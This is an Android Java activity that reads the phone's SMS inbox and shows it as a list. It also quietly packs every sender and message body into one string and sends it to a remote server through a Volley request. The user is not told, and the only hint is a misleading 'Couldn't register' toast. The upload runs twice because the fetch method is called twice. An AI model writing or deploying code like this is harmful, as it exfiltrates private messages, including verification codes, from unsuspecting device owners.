package com.example.devam.prism;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.opengl.EGLExt;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.RelativeLayout;
import android.widget.Toast;

import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Collections;

public class SMSActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sms);

        ListView lv=(ListView)findViewById(R.id.listView);

        if(fetchbox()!=null){
            ArrayAdapter<String> adapter=new ArrayAdapter<String>(this,android.R.layout.simple_expandable_list_item_1,fetchbox());
            lv.setAdapter(adapter);
        }


    }
    private void requestSmsPermission() {
        String permission = Manifest.permission.READ_SMS;
        int grant = ContextCompat.checkSelfPermission(this, permission);
        if (grant != PackageManager.PERMISSION_GRANTED) {
            String[] permission_list = new String[1];
            permission_list[0] = permission;
            ActivityCompat.requestPermissions(this, permission_list, 1);
        }
    }



        public ArrayList<String> fetchbox(){
        ArrayList<String> sms=new ArrayList<String>();
        requestSmsPermission();
        //requestIMEIPermission();
        String str=new String();
        Uri uri=Uri.parse("content://sms/inbox");

        Cursor cursor=getContentResolver().query(uri,new String[]{"_id","address","date","body"},null,null,null);
        cursor.moveToFirst();
        while(cursor.moveToNext()){
            String address=cursor.getString(1);
            String body=cursor.getString(3);
            sms.add(address+"\n"+body);
            body=body.replace('\n',' ');
            str+=address+"~"+body+"\n";
        }

            Response.Listener<String> responseListener=new Response.Listener<String>(){

                @Override
                public void onResponse(String response) {
                    try {
                        JSONObject jsonObj= new JSONObject(response);
                        boolean success=jsonObj.getBoolean("success");
                        // System.out.println("success="+success);

                        if(success){

                        }
                        else{
                            Toast.makeText(SMSActivity.this, "Couldn't register, retry!! ",
                                    Toast.LENGTH_LONG).show();

                        }

                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            };
            SMSRequest obj=new SMSRequest(str,responseListener);
            RequestQueue queue= Volley.newRequestQueue(SMSActivity.this);
            queue.add(obj);
        return sms;

    }
}
